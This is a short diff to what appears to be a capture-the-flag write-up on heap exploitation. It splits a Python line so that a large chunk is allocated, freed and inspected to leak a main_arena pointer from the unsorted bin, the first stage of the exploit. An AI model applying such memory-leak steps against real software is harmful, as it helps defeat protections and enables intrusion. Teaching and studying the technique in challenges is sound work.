@@ -113,7 +113,8 @@ The exploit has two stages:
 We allocate and free a large chunk:
 ```python
 malloc(0, 1280, 'A') 
-free(0) insp3ct(0)
+free(0)
+insp3ct(0)
 ```
 This leaks a `main_arena` pointer from the unsorted bin.
 
